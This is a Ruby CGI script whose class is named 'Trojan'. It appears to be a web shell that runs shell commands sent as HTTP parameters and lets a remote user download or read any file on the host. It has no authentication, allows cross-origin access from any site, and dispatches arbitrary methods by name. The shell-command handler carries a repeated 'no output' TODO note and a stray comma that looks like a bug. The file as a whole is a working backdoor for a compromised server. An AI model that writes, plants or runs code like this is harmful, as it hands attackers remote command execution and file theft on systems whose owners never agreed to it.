#!/usr/bin/env ruby
require 'cgi'
require 'cgi/session'
require 'cgi/session/pstore'
require 'fileutils'
require 'json'

class Trojan
    attr_accessor :cgi, :cwd, :response, :session

    def initialize params
        # store the session and cgi objects
        @cgi      = params[:cgi]
        @session  = params[:session]

        # emulate cwd persistence
        @cwd      = (@session[:cwd].nil?) ? `pwd`.strip! : @session[:cwd]

        # vivify the response object
        @response = {};
    end

    def process_command()
        json = @cgi.params

        # if the specified action was 'shell', pipe the command directly into
        # the web shell.
        if json['action'].first.eql? 'shell'
            process_shell_command(json['cmd'].first)
        # otherwise, simply invoke the method directly
        else
            send json['action'].first, json
        end
    end

    def process_shell_command command
        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
        std_lines           = `cd #{@cwd}; #{command} 2>&1; pwd`.split("\n");
        @cwd                = @session[:cwd] = std_lines.pop
        @response['output'] = std_lines.join "\n",
        self.send_response
    end

    def send_response
        @response['prompt_context'] = self.get_prompt_context
        puts @cgi.header('Access-Control-Allow-Origin: *')
        puts @response.to_json
        exit
    end

    def get_prompt_context
        whoami          =  `whoami`.strip!
        hostname        =  `hostname`.strip!
        line_terminator =  (whoami == 'root') ? '#' : '$';
        return "#{whoami}@#{hostname}:#{@cwd}#{line_terminator}";
    end

    def method_missing method, *args
        @response['error'] = "#{method} unsupported"
        self.send_response
    end

    ##########################################################################
    # Payload functions are from here downward
    ##########################################################################
    def payload_file_down json
        # emulate directory persistence
        Dir.chdir @cwd
        dl_file = json['args[file]'].first

        # if the requested file exists, serve it up to the user
        if File.exist? dl_file
            puts @cgi.header(
                'Content-Disposition'       => 'attachment; filename=' + File.basename(dl_file),
                'Content-Transfer-Encoding' => 'binary',
            );
            puts File.read(dl_file)

        # if not, provide a notification
        else
            puts "File does not exist"
        end
    end

    def payload_file_read json
        Dir.chdir @cwd
        dl_file = json['args[file]'].first

        unless File.readable? dl_file
            @response['error'] = 'File is not readable or does not exist.'
        else
            @response['output'] = {
                'output' => File.read(dl_file),
                'file'   => File.realpath(dl_file),
            }
        end

        self.send_response
    end
end

# ---------- Procedural code starts here ----------
cgi     = CGI.new
session = CGI::Session.new(
    cgi,
    'database_manager' => CGI::Session::PStore,
    'session_key'      => 'wash',
    'session_expires'  => Time.now + 30 * 60,
    'prefix'           => 'wash_pstore_sid_'
)
trojan = Trojan.new({
    :cgi     => cgi, 
    :session => session, 
})

trojan.process_command

# save session data
session.close
